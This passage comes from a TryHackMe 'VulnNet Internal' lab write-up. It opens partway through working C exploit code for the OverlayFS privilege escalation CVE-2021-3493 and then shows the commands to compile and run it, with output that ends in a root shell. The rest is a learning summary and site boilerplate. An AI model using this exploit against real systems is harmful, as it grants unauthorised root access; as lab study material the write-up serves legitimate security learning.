    xwritefile("/proc/self/uid_map", buf);

    sprintf(buf, "0 %d 1", gid);
    xwritefile("/proc/self/gid_map", buf);

    sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);
    if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)
        err(1, "mount %s", DIR_MERGE);

    // all+ep
    char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";

    xcopyfile("/proc/self/exe", BIN_MERGE, 0777);
    if (setxattr(BIN_MERGE, "security.capability", cap, sizeof(cap) - 1, 0) == -1)
        err(1, "setxattr %s", BIN_MERGE);

    return 0;
}

int main(int argc, char *argv[])
{
    if (strstr(argv[0], "magic") || (argc &gt; 1 &amp;&amp; !strcmp(argv[1], "shell"))) {
        setuid(0);
        setgid(0);
        execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);
        err(1, "execl /bin/bash");
    }

    pid_t child = fork();
    if (child == -1)
        err(1, "fork");

    if (child == 0) {
        _exit(exploit());
    } else {
        waitpid(child, NULL, 0);
    }

    execl(BIN_UPPER, BIN_UPPER, "shell", NULL);
    err(1, "execl %s", BIN_UPPER);
}</code></pre><p id="c725" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now save The above code &amp; copy it.</p><pre class="language-bash line-numbers"><code>❯sys-internal@vulnnet-internal:~$ nano exploit.c
# put here the above code
# than close nano: crtl + S + X</code></pre><p id="fc6b" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we need to compile it..</p><p id="9781" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph=""><em>Reference —</em> <a class="af rn" href="https://ssd-disclosure.com/wp-content/uploads/2021/04/ubuntu.gif" rel="noopener ugc nofollow" target="_blank">https://ssd-disclosure.com/wp-content/uploads/2021/04/ubuntu.gif</a></p><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km ace"><figure class="bg yx yy c"><figure class="is-loaded"><img decoding="async" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/0*2snuFHyTasNIbC5t.gif" alt="" width="700" height="342" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure></div></div></figure><pre class="language-bash line-numbers"><code>❯sys-internal@vulnnet-internal:~$ gcc exploit.c -o exploit</code></pre><p id="7a11" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now run the exploit..</p><pre class="language-bash line-numbers"><code>❯sys-internal@vulnnet-internal:~$ ./exploit
bash-4.4# id
uid=1000(sys-internal) gid=1000(sys-internal) euid=0(root) groups=1000(sys-internal),24(cdrom)
bash-4.4# cd /root
bash-4.4# ls
root.txt
bash-4.4# cat root.txt |wc -c
38
bash-4.4#</code></pre><p id="7dfc" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We are root now and a very interesting room is completed!</p><h4 id="e906" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">In this room, we learned about —</h4><ul><li id="e321" class="xw xx tu ly b xy abh ya yb yc abi ye yf abu abj yh yi abv abk yk yl abw abl yn yo yp acj ack acl bj" data-selectable-paragraph="">SMB service enumeration</li><li id="5344" class="xw xx tu ly b xy acm ya yb yc acn ye yf abu aco yh yi abv acp yk yl abw acq yn yo yp acj ack acl bj" data-selectable-paragraph="">RPC Service enumeration</li><li id="2316" class="xw xx tu ly b xy acm ya yb yc acn ye yf abu aco yh yi abv acp yk yl abw acq yn yo yp acj ack acl bj" data-selectable-paragraph="">use of rsync</li><li id="6e01" class="xw xx tu ly b xy acm ya yb yc acn ye yf abu aco yh yi abv acp yk yl abw acq yn yo yp acj ack acl bj" data-selectable-paragraph="">Team service Project and build configuration</li><li id="1ce3" class="xw xx tu ly b xy acm ya yb yc acn ye yf abu aco yh yi abv acp yk yl abw acq yn yo yp acj ack acl bj" data-selectable-paragraph="">CVE-2021–3493 — OverlayFS PE Vulnerability</li></ul><p id="d210" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Thanks for Reading!!</strong></p><p id="caaa" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Follow me on Twitter</strong>: <a class="af rn" href="https://twitter.com/sakibulalikhan" rel="noopener ugc nofollow" target="_blank">https://twitter.com/sakibulalikhan</a></p><p id="a415" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Happy VulnNet Internal~</strong></p><figure class="yq yr ys yt yu yv kl km paragraph-image"><a href="https://www.buymeacoffee.com/sakibulalikhan" class="extlink extlink-icon-5" title="sakibulalikhan"></a></figure></div><footer></footer></div></div><footer class="wrapper post__footer"><p class="post__last-updated">This article was updated on Nov 30, 2024</p><div class="post__share"><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsakibulalikhan.pages.dev%2Ftryhackme-writeup-vulnnet-internal.html" class="js-share invert facebook" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#facebook"/></svg> <span>Facebook</span> </a><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Ftryhackme-writeup-vulnnet-internal.html&amp;via=sakibulalikhan&amp;text=TryHackMe%20Writeup%20%E2%80%94%20VulnNet%20Internal" class="js-share invert twitter" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#twitter"/></svg> <span>Twitter</span> </a><a href="https://pinterest.com/pin/create/button/?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Ftryhackme-writeup-vulnnet-internal.html&amp;media=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fmedia%2Fposts%2F1%2Fmaxresdefault-4012345193.jpg&amp;description=TryHackMe%20Writeup%20%E2%80%94%20VulnNet%20Internal" class="js-share invert pinterest" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#pinterest"/></svg> <span>Pinterest</span> </a><a href="https://mix.com/add?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Ftryhackme-writeup-vulnnet-internal.html" class="js-share invert mix" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#mix"/></svg> <span>Mix</span> </a><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Ftryhackme-writeup-vulnnet-internal.html" class="js-share invert linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=TryHackMe%20Writeup%20%E2%80%94%20VulnNet%20Internal&amp;url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Ftryhackme-writeup-vulnnet-internal.html" class="js-share invert buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=TryHackMe%20Writeup%20%E2%80%94%20VulnNet%20Internal https%3A%2F%2Fsakibulalikhan.pages.dev%2Ftryhackme-writeup-vulnnet-internal.html" class="js-share invert whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></footer><nav class="pagination"><div class="pagination__title"><span>Read other posts</span></div><div class="pagination__buttons"><a href="https://sakibulalikhan.pages.dev/the-dirty-pipe-vulnerability-on-linux.html" class="btn next" rel="next" aria-label="[MISSING TRANSLATION]:  The Dirty Pipe Vulnerability On Linux "><span class="btn__text">The Dirty Pipe Vulnerability On Linux</span> <span class="btn__icon">→</span></a></div></nav></article><div class="post__comments"><div class="comments"><div class="comments-wrapper"><h2>Comments</h2><div id="disqus_thread"></div><noscript>Please enable JS to use the comments form.</noscript><script type="text/javascript">var disqus_config = function () {
							this.page.url = 'https://sakibulalikhan.pages.dev/tryhackme-writeup-vulnnet-internal.html';
							this.page.identifier = '1'; 
							this.language = 'en_US';
						};
						
						
				var disqus_element_to_check = document.getElementById('disqus_thread');

				if ('IntersectionObserver' in window) {
					var iObserver = new IntersectionObserver(
						(entries, observer) => {
							entries.forEach(entry => {
								if (entry.intersectionRatio >= 0.1) {
									(function () {
										var d = document, s = d.createElement('script');
										s.src = 'https://'+('sakibulalikhan-github-io').trim()+'.disqus.com/embed.js';
										s.setAttribute('data-timestamp', +new Date());
										(d.head || d.body).appendChild(s);
									})();
									observer.unobserve(entry.target);
								}
							});
						},
						{
							threshold: [0, 0.2, 0.5, 1]
						}
					);

					iObserver.observe(disqus_element_to_check);
				} else {
					(function () {
						var d = document, s = d.createElement('script');
						s.src = 'https://'+('sakibulalikhan-github-io').trim()+'.disqus.com/embed.js';
						s.setAttribute('data-timestamp', +new Date());
						(d.head || d.body).appendChild(s);
					})();
				}</script><script type="text/javascript"></script></div></div></div></main><footer class="footer"><div class="footer__inner"><div class="footer__copyright"><p class="align-center">Sakibul Ali Khan • © 2024 • Offens!ve Blogs • <a href="https://sakibulalikhan.pages.dev/cookie-policy.html" title="Offens!ve Blogs Cookie Policy">Cookies</a> • <a href="https://sakibulalikhan.pages.dev/privacy-policy.html" title="Privacy Policy for Offens!ve Blogs">Privacy</a></p></div></div></footer></div><script defer="defer" src="https://sakibulalikhan.pages.dev/assets/js/scripts.min.js?v=c2232aa7558e9517946129d2a1b8c770"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
        for (var i = 0; i < images.length; i++) {
            if (images[i].complete) {
                images[i].classList.add('is-loaded');
            } else {
                images[i].addEventListener('load', function () {
                    this.classList.add('is-loaded');
                }, false);
            }
        }</script><script defer="defer" src="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/prism.js"></script><script defer="defer" src="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/prism-line-numbers.min.js"></script><script defer="defer" src="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/clipboard.min.js"></script><script defer="defer" src="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/prism-copy-to-clipboard.min.js"></script><script src="https://sakibulalikhan.pages.dev/media/plugins/pagePrefetching/quicklink.umd.js"></script><script>window.addEventListener('load', () => {
					quicklink.listen({
						prerender: false,
						el: document.querySelector('body'),
						delay: 0,
						limit: Infinity,
						throttle: Infinity,
						timeout: 2000
					});
				});</script><div class="pcb" data-behaviour="link" data-behaviour-link="https://sakibulalikhan.pages.dev/cookie-policy.html" data-revision="1" data-config-ttl="365" data-debug-mode="false"><div role="dialog" aria-modal="true" aria-hidden="true" aria-labelledby="pcb-title" aria-describedby="pcb-txt" class="pcb__banner pcb__banner--left"><div class="pcb__inner"><div id="pcb-title" role="heading" aria-level="2" class="pcb__title">Cookies</div><div id="pcb-txt" class="pcb__txt">To enhance your experience on this website, we use cookies for analytics and performance purposes. <a href="https://sakibulalikhan.pages.dev/cookie-policy.html">Cookie Policy</a></div><div class="pcb__buttons"><button type="button" class="pcb__btn pcb__btn--solid pcb__btn--accept">Got it!</button></div></div></div></div><script>(function(win) {
    if (!document.querySelector('.pcb')) {
        return;
    }

    var cbConfig = {
        behaviour: document.querySelector('.pcb').getAttribute('data-behaviour'),
        behaviourLink: document.querySelector('.pcb').getAttribute('data-behaviour-link'),
        revision: document.querySelector('.pcb').getAttribute('data-revision'),
        configTTL: parseInt(document.querySelector('.pcb').getAttribute('data-config-ttl'), 10),
        debugMode: document.querySelector('.pcb').getAttribute('data-debug-mode') === 'true',
        initialState: null,
        initialLsState: null,
        previouslyAccepted: []
    };

    var cbUI = {
        wrapper: document.querySelector('.pcb'),
        banner: {
            element: null,
            btnAccept: null,
            btnReject: null,
            btnConfigure: null
        },
        popup: {
            element: null,
            btnClose: null,
            btnSave: null,
            btnAccept: null,
            btnReject: null,
            checkboxes: null,
        },
        overlay: null,
        badge: null,
        blockedScripts: document.querySelectorAll('script[type^="gdpr-blocker/"]'),
        triggerLinks: cbConfig.behaviourLink ? document.querySelectorAll('a[href*="' + cbConfig.behaviourLink + '"]') : null
    };

    function initUI () {
        // setup banner elements
        cbUI.banner.element = cbUI.wrapper.querySelector('.pcb__banner');
        cbUI.banner.btnAccept = cbUI.banner.element.querySelector('.pcb__btn--accept');
        cbUI.banner.btnReject = cbUI.banner.element.querySelector('.pcb__btn--reject');
        cbUI.banner.btnConfigure = cbUI.banner.element.querySelector('.pcb__btn--configure');

        // setup popup elements
        if (cbUI.wrapper.querySelector('.pcb__popup')) {
            cbUI.popup.element = cbUI.wrapper.querySelector('.pcb__popup');
            cbUI.popup.btnClose = cbUI.wrapper.querySelector('.pcb__popup__close');
            cbUI.popup.btnSave = cbUI.popup.element.querySelector('.pcb__btn--save');
            cbUI.popup.btnAccept = cbUI.popup.element.querySelector('.pcb__btn--accept');
            cbUI.popup.btnReject = cbUI.popup.element.querySelector('.pcb__btn--reject');
            cbUI.popup.checkboxes = cbUI.popup.element.querySelector('input[type="checkbox"]');
            // setup overlay
            cbUI.overlay = cbUI.wrapper.querySelector('.pcb__overlay');
        }

        cbUI.badge = cbUI.wrapper.querySelector('.pcb__badge');

        if (cbConfig.behaviour.indexOf('link') > -1) {
            for (var i = 0; i < cbUI.triggerLinks.length; i++) {
                cbUI.triggerLinks[i].addEventListener('click', function(e) {
                    e.preventDefault();
                    showBannerOrPopup();
                });
            }
        }
    }

    function initState () {
        var lsKeyName = getConfigName();
        var currentConfig = localStorage.getItem(lsKeyName);
        var configIsFresh = checkIfConfigIsFresh();

        if (!configIsFresh || currentConfig === null) {
            if (cbConfig.debugMode) {
                console.log('🍪 Config not found, or configuration expired');
            }

            if (window.publiiCBGCM) {
                gtag('consent', 'default', {
                    'ad_storage': window.publiiCBGCM.defaultState.ad_storage ? 'granted' : 'denied',
                    'ad_personalization': window.publiiCBGCM.defaultState.ad_personalization ? 'granted' : 'denied',
                    'ad_user_data': window.publiiCBGCM.defaultState.ad_user_data ? 'granted' : 'denied',
                    'analytics_storage': window.publiiCBGCM.defaultState.analytics_storage ? 'granted' : 'denied',
                    'personalization_storage': window.publiiCBGCM.defaultState.personalization_storage ? 'granted' : 'denied',
                    'functionality_storage': window.publiiCBGCM.defaultState.functionality_storage ? 'granted' : 'denied',
                    'security_storage': window.publiiCBGCM.defaultState.security_storage ? 'granted' : 'denied'
                });  
                
                if (cbConfig.debugMode) {
                    console.log('🍪 GCMv2 DEFAULT STATE: ' + JSON.stringify({
                        'ad_storage': window.publiiCBGCM.defaultState.ad_storage ? 'granted' : 'denied',
                        'ad_personalization': window.publiiCBGCM.defaultState.ad_personalization ? 'granted' : 'denied',
                        'ad_user_data': window.publiiCBGCM.defaultState.ad_user_data ? 'granted' : 'denied',
                        'analytics_storage': window.publiiCBGCM.defaultState.analytics_storage ? 'granted' : 'denied',
                        'personalization_storage': window.publiiCBGCM.defaultState.personalization_storage ? 'granted' : 'denied',
                        'functionality_storage': window.publiiCBGCM.defaultState.functionality_storage ? 'granted' : 'denied',
                        'security_storage': window.publiiCBGCM.defaultState.security_storage ? 'granted' : 'denied'
                    }));
                }
            }

            showBanner();
        } else if (typeof currentConfig === 'string') {
            if (cbConfig.debugMode) {
                console.log('🍪 Config founded');
            }

            cbConfig.initialLsState = currentConfig.split(',');

            if (window.publiiCBGCM) {
                gtag('consent', 'default', {
                    'ad_storage': getDefaultConsentState(currentConfig, 'ad_storage'),
                    'ad_personalization': getDefaultConsentState(currentConfig, 'ad_personalization'),
                    'ad_user_data': getDefaultConsentState(currentConfig, 'ad_user_data'),
                    'analytics_storage': getDefaultConsentState(currentConfig, 'analytics_storage'),
                    'personalization_storage': getDefaultConsentState(currentConfig, 'personalization_storage'),
                    'functionality_storage': getDefaultConsentState(currentConfig, 'functionality_storage'),
                    'security_storage': getDefaultConsentState(currentConfig, 'security_storage')
                });
                
                if (cbConfig.debugMode) {
                    console.log('🍪 GCMv2 DEFAULT STATE: ' + JSON.stringify({
                        'ad_storage': getDefaultConsentState(currentConfig, 'ad_storage'),
                        'ad_personalization': getDefaultConsentState(currentConfig, 'ad_personalization'),
                        'ad_user_data': getDefaultConsentState(currentConfig, 'ad_user_data'),
                        'analytics_storage': getDefaultConsentState(currentConfig, 'analytics_storage'),
                        'personalization_storage': getDefaultConsentState(currentConfig, 'personalization_storage'),
                        'functionality_storage': getDefaultConsentState(currentConfig, 'functionality_storage'),
                        'security_storage': getDefaultConsentState(currentConfig, 'security_storage')
                    }));
                }
            }

            showBadge();

            if (cbUI.popup.element) {
                var allowedGroups = currentConfig.split(',');
                var checkedCheckboxes = cbUI.popup.element.querySelectorAll('input[type="checkbox"]:checked');

                for (var j = 0; j < checkedCheckboxes.length; j++) {
                    var name = checkedCheckboxes[j].getAttribute('data-group-name');

                    if (name && name !== '-' && allowedGroups.indexOf(name) === -1) {
                        checkedCheckboxes[j].checked = false;
                    }
                }

                for (var i = 0; i < allowedGroups.length; i++) {
                    var checkbox = cbUI.popup.element.querySelector('input[type="checkbox"][data-group-name="' + allowedGroups[i] + '"]');

                    if (checkbox) {
                        checkbox.checked = true;
                    }

                    allowCookieGroup(allowedGroups[i]);
                }
            }
        }

        setTimeout(function () {
            cbConfig.initialState = getInitialStateOfConsents();
        }, 0);
    }

    function checkIfConfigIsFresh () {
        var lastConfigSave = localStorage.getItem('publii-gdpr-cookies-config-save-date');

        if (lastConfigSave === null) {
            return false;
        }

        lastConfigSave = parseInt(lastConfigSave, 10);

        if (lastConfigSave === 0) {
            return true;
        }

        if (+new Date() - lastConfigSave < cbConfig.configTTL * 24 * 60 * 60 * 1000) {
            return true;
        }

        return false;
    }

    function getDefaultConsentState (currentConfig, consentGroup) {
        let configGroups = currentConfig.split(',');

        for (let i = 0; i < configGroups.length; i++) {
            let groupName = configGroups[i];
            let group = window.publiiCBGCM.groups.find(group => group.cookieGroup === groupName);

            if (group && group[consentGroup]) {
                return 'granted';
            }
        }  
        
        if (window.publiiCBGCM.defaultState[consentGroup]) {
            return 'granted'; 
        }
        
        return 'denied';
    }

    function initBannerEvents () {
        cbUI.banner.btnAccept.addEventListener('click', function (e) {
            e.preventDefault();
            acceptAllCookies('banner');
            showBadge();
        }, false);

        if (cbUI.banner.btnReject) {
            cbUI.banner.btnReject.addEventListener('click', function (e) {
                e.preventDefault();
                rejectAllCookies();
                showBadge();
            }, false);
        }

        if (cbUI.banner.btnConfigure) {
            cbUI.banner.btnConfigure.addEventListener('click', function (e) {
                e.preventDefault();
                hideBanner();
                showAdvancedPopup();
                showBadge();
            }, false);
        }
    }

    function initPopupEvents () {
        if (!cbUI.popup.element) {
            return;
        }

        cbUI.overlay.addEventListener('click', function (e) {
            hideAdvancedPopup();
        }, false);

        cbUI.popup.element.addEventListener('click', function (e) {
            e.stopPropagation();
        }, false);

        cbUI.popup.btnAccept.addEventListener('click', function (e) {
            e.preventDefault();
            acceptAllCookies('popup');
        }, false);

        cbUI.popup.btnReject.addEventListener('click', function (e) {
            e.preventDefault();
            rejectAllCookies();
        }, false);

        cbUI.popup.btnSave.addEventListener('click', function (e) {
            e.preventDefault();
            saveConfiguration();
        }, false);

        cbUI.popup.btnClose.addEventListener('click', function (e) {
            e.preventDefault();
            hideAdvancedPopup();
        }, false);
    }

    function initBadgeEvents () {
        if (!cbUI.badge) {
            return;
        }

        cbUI.badge.addEventListener('click', function (e) {
            showBannerOrPopup();
        }, false);
    }

    initUI();
    initState();
    initBannerEvents();
    initPopupEvents();
    initBadgeEvents();

    /**
     * API
     */
    function addScript (src, inline) {
        var newScript = document.createElement('script');

        if (src) {
            newScript.setAttribute('src', src);
        }

        if (inline) {
            newScript.text = inline;
        }

        document.body.appendChild(newScript);
    }

    function allowCookieGroup (allowedGroup) {
        var scripts = document.querySelectorAll('script[type="gdpr-blocker/' + allowedGroup + '"]');
        cbConfig.previouslyAccepted.push(allowedGroup);
    
        for (var j = 0; j < scripts.length; j++) {
            addScript(scripts[j].src, scripts[j].text);
        }

        var groupEvent = new Event('publii-cookie-banner-unblock-' + allowedGroup);
        document.body.dispatchEvent(groupEvent);
        unlockEmbeds(allowedGroup);

        if (cbConfig.debugMode) {
            console.log('🍪 Allowed group: ' + allowedGroup);
        }

        if (window.publiiCBGCM && cbConfig.initialLsState.indexOf(allowedGroup) === -1) {
            let consentResult = {};
            let group = window.publiiCBGCM.groups.find(group => group.cookieGroup === allowedGroup);

            if (group) {
                let foundSomeConsents = false;

                Object.keys(group).forEach(key => {
                    if (key !== 'cookieGroup' && group[key] === true) {
                        consentResult[key] = 'granted';
                        foundSomeConsents = true;
                    }
                });

                if (foundSomeConsents) {
                    gtag('consent', 'update', consentResult);   

                    if (cbConfig.debugMode) {
                        console.log('🍪 GCMv2 UPDATE: ' + JSON.stringify(consentResult));
                    }
                }
            }
        }
    }

    function showBannerOrPopup () {
        if (cbUI.popup.element) {
            showAdvancedPopup();
        } else {
            showBanner();
        }
    }

    function showAdvancedPopup () {
        cbUI.popup.element.classList.add('is-visible');
        cbUI.overlay.classList.add('is-visible');
        cbUI.popup.element.setAttribute('aria-hidden', 'false');
        cbUI.overlay.setAttribute('aria-hidden', 'false');
    }

    function hideAdvancedPopup () {
        cbUI.popup.element.classList.remove('is-visible');
        cbUI.overlay.classList.remove('is-visible');
        cbUI.popup.element.setAttribute('aria-hidden', 'true');
        cbUI.overlay.setAttribute('aria-hidden', 'true');
    }

    function showBanner () {
        cbUI.banner.element.classList.add('is-visible');
        cbUI.banner.element.setAttribute('aria-hidden', 'false');
    }

    function hideBanner () {
        cbUI.banner.element.classList.remove('is-visible');
        cbUI.banner.element.setAttribute('aria-hidden', 'true');
    }

    function showBadge () {
        if (!cbUI.badge) {
            return;
        }

        cbUI.badge.classList.add('is-visible');
        cbUI.badge.setAttribute('aria-hidden', 'false');
    }

    function getConfigName () {
        var lsKeyName = 'publii-gdpr-allowed-cookies';

        if (cbConfig.revision) {
            lsKeyName = lsKeyName + '-v' + parseInt(cbConfig.revision, 10);
        }

        return lsKeyName;
    }

    function storeConfiguration (allowedGroups) {
        var lsKeyName = getConfigName();
        var dataToStore = allowedGroups.join(',');
        localStorage.setItem(lsKeyName, dataToStore);

        if (cbConfig.configTTL === 0) {
            localStorage.setItem('publii-gdpr-cookies-config-save-date', 0);

            if (cbConfig.debugMode) {
                console.log('🍪 Store never expiring configuration');
            }
        } else {
            localStorage.setItem('publii-gdpr-cookies-config-save-date', +new Date());
        }
    }

    function getInitialStateOfConsents () {
        if (!cbUI.popup.element) {
            return [];
        }

        var checkedGroups = cbUI.popup.element.querySelectorAll('input[type="checkbox"]:checked');
        var groups = [];

        for (var i = 0; i < checkedGroups.length; i++) {
            var allowedGroup = checkedGroups[i].getAttribute('data-group-name');

            if (allowedGroup !== '') {
                groups.push(allowedGroup);
            }
        }

        if (cbConfig.debugMode) {
            console.log('🍪 Initial state: ' + groups.join(', '));
        }

        return groups;
    }

    function getCurrentStateOfConsents () {
        if (!cbUI.popup.element) {
            return [];
        }

        var checkedGroups = cbUI.popup.element.querySelectorAll('input[type="checkbox"]:checked');
        var groups = [];

        for (var i = 0; i < checkedGroups.length; i++) {
            var allowedGroup = checkedGroups[i].getAttribute('data-group-name');

            if (allowedGroup !== '') {
                groups.push(allowedGroup);
            }
        }

        if (cbConfig.debugMode) {
            console.log('🍪 State to save: ' + groups.join(', '));
        }

        return groups;
    }

    function getAllGroups () {
        if (!cbUI.popup.element) {
            return [];
        }

        var checkedGroups = cbUI.popup.element.querySelectorAll('input[type="checkbox"]');
        var groups = [];

        for (var i = 0; i < checkedGroups.length; i++) {
            var allowedGroup = checkedGroups[i].getAttribute('data-group-name');

            if (allowedGroup !== '') {
                groups.push(allowedGroup);
            }
        }

        return groups;
    }

    function acceptAllCookies (source) {
        var groupsToAccept = getAllGroups();
        storeConfiguration(groupsToAccept);

        for (var i = 0; i < groupsToAccept.length; i++) {
            var group = groupsToAccept[i];

            if (cbConfig.initialState.indexOf(group) > -1 || cbConfig.previouslyAccepted.indexOf(group) > -1) {
                if (cbConfig.debugMode) {
                    console.log('🍪 Skip previously activated group: ' + group);
                }

                continue;
            }

            allowCookieGroup(group);
        }

        if (cbUI.popup.element) {
            var checkboxesToCheck = cbUI.popup.element.querySelectorAll('input[type="checkbox"]');

            for (var j = 0; j < checkboxesToCheck.length; j++) {
                checkboxesToCheck[j].checked = true;
            }
        }

        if (cbConfig.debugMode) {
            console.log('🍪 Accept all cookies: ', groupsToAccept.join(', '));
        }

        if (source === 'popup') {
            hideAdvancedPopup();
        } else if (source === 'banner') {
            hideBanner();
        }
    }

    function rejectAllCookies () {
        if (cbConfig.debugMode) {
            console.log('🍪 Reject all cookies');
        }

        storeConfiguration([]);
        setTimeout(function () {
            window.location.reload();
        }, 100);
    }

    function saveConfiguration () {
        var groupsToAccept = getCurrentStateOfConsents();
        storeConfiguration(groupsToAccept);

        if (cbConfig.debugMode) {
            console.log('🍪 Save new config: ', groupsToAccept.join(', '));
        }

        if (reloadIsNeeded(groupsToAccept)) {
            setTimeout(function () {
                window.location.reload();
            }, 100);
            return;
        }

        for (var i = 0; i < groupsToAccept.length; i++) {
            var group = groupsToAccept[i];

            if (cbConfig.initialState.indexOf(group) > -1 || cbConfig.previouslyAccepted.indexOf(group) > -1) {
                if (cbConfig.debugMode) {
                    console.log('🍪 Skip previously activated group: ' + group);
                }

                continue;
            }

            allowCookieGroup(group);
        }

        hideAdvancedPopup();
    }

    function reloadIsNeeded (groupsToAccept) {
        // check if user rejected consent for initial groups
        var initialGroups = cbConfig.initialState;
        var previouslyAcceptedGroups = cbConfig.previouslyAccepted;
        var groupsToCheck = initialGroups.concat(previouslyAcceptedGroups);

        for (var i = 0; i < groupsToCheck.length; i++) {
            var groupToCheck = groupsToCheck[i];

            if (groupToCheck !== '' && groupsToAccept.indexOf(groupToCheck) === -1) {
                if (cbConfig.debugMode) {
                    console.log('🍪 Reload is needed due lack of: ', groupToCheck);
                }

                return true;
            }
        }

        return false;
    }

    function unlockEmbeds (cookieGroup) {
        var iframesToUnlock = document.querySelectorAll('.pec-wrapper[data-consent-group-id="' + cookieGroup + '"]');

        for (var i = 0; i < iframesToUnlock.length; i++) {
            var iframeWrapper = iframesToUnlock[i];
            iframeWrapper.querySelector('.pec-overlay').classList.remove('is-active');
            iframeWrapper.querySelector('.pec-overlay').setAttribute('aria-hidden', 'true');
            var iframe = iframeWrapper.querySelector('iframe');
            iframe.setAttribute('src', iframe.getAttribute('data-consent-src'));
        }
    }

    win.publiiEmbedConsentGiven = function (cookieGroup) {
        // it will unlock embeds
        allowCookieGroup(cookieGroup);

        var checkbox = cbUI.popup.element.querySelector('input[type="checkbox"][data-group-name="' + cookieGroup + '"]');

        if (checkbox) {
            checkbox.checked = true;
        }

        var groupsToAccept = getCurrentStateOfConsents();
        storeConfiguration(groupsToAccept);

        if (cbConfig.debugMode) {
            console.log('🍪 Save new config: ', groupsToAccept.join(', '));
        }
    }
})(window);</script></body></html>